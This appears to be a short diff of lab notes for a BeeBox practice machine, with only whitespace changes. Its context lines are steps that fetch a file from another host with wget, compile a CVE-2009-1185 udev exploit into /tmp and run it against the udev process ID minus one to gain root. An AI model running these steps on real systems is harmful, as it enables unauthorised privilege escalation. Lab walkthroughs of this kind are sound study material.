@@ -33,8 +33,8 @@ On BeeBox:
 wget http://192.168.112.4/run -o /tmp/cd un 
 gcc cve-2009-1185.c -o /tmp/privescalation  
 chmod +x /tmp/privescalation  
-cd /tmp 
-ps aux | grep udev  
+cd /tmp    
+ps aux | grep udev      
 ./privescalation (PID discovered with grep minus 1 - e.g. 2864 - 1 = 2863)  
 
 
